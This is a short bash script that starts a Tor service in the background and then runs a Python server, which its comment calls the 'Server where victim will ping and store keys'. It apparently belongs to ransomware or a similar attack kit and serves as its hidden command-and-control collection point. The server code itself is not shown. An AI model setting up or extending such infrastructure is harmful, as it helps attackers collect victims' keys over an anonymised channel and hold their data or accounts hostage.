#!/bin/bash

echo "SCRIPT #WEBSERVER TOR"

#Execute tor service
tor &


#Server where victim will ping and store keys
python server.py